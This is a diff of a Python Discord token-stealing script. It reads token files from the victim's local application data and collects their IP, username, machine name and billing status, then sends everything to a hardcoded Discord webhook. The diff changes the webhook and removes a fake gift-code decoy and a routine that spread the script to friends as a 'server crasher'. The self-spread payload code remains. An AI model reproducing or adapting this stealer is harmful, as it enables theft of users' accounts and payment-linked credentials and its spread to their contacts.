@@ -10,12 +10,6 @@ from datetime import datetime
 from threading import Thread
 from time import sleep
 from sys import argv
-import time
-
-print("Generating Random Gift Code!...")
-time.sleep(2)
-print("Done Generating!... Window Should Automitcally Close!")
-
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
@@ -51,17 +45,10 @@ def gettokens(path):
                 for token in findall(regex, line):
                     tokens.append(token)
     return tokens
-def getdeveloper():
-    dev = "wodx"
-    try:
-        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
-    except:
-        pass
-    return dev
 def getip():
     ip = "None"
     try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
     except:
         pass
     return ip
@@ -72,38 +59,11 @@ def getavatar(uid, aid):
     except:
         url = url[:-4]
     return url
-def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-def getfriends(token):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
-    except:
-        pass
-def getchat(token, uid):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
-    except:
-        pass
 def has_payment_methods(token):
     try:
         return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
     except:
         pass
-def send_message(token, chat_id, form_data):
-    try:
-        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
-    except:
-        pass
-def spread(token, form_data, delay):
-    return # Remove to re-enabled
-    for friend in getfriends(token):
-        try:
-            chat_id = getchat(token, friend["id"])
-            send_message(token, chat_id, form_data)
-        except Exception as e:
-            pass
-        sleep(delay)
 def main():
     cache_path = ROAMING + "\\.cache~$"
     prevent_spam = True
@@ -117,7 +77,6 @@ def main():
     pc_username = os.getenv("UserName")
     pc_name = os.getenv("COMPUTERNAME")
     user_path_name = os.getenv("userprofile").split("\\")[2]
-    developer = getdeveloper()
     for platform, path in PATHS.items():
         if not os.path.exists(path):
             continue
@@ -184,10 +143,10 @@ def main():
         "content": "",
         "embeds": embeds,
         "username": "Discord Token Grabber",
-        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+        "avatar_url": "https://cdn.discordapp.com/attachments/809725604399939616/815673893150916611/qTPCE968_400x400.jpg"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/810991344288792616/ylasLFBiGN8BSKH8uPhF0LuLniUN3niS80PZDkHd348qBHVID7KS2KZfDlmYuazOc_6N", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discordapp.com/api/webhooks/815669176601542686/y7Eu4nUJHeGvZLWQtASOpDSbQpCXRA3HLmp1H-4fO0qXlfh4AmWS_qkjVy-2Gw6Sk28K", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
@@ -195,7 +154,7 @@ def main():
             with open(argv[0], encoding="utf-8") as file:
                 content = file.read()
             payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
-            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+            Thread(args=(token, payload, 7500 / 1000)).start()
 try:
     main()
 except Exception as e:
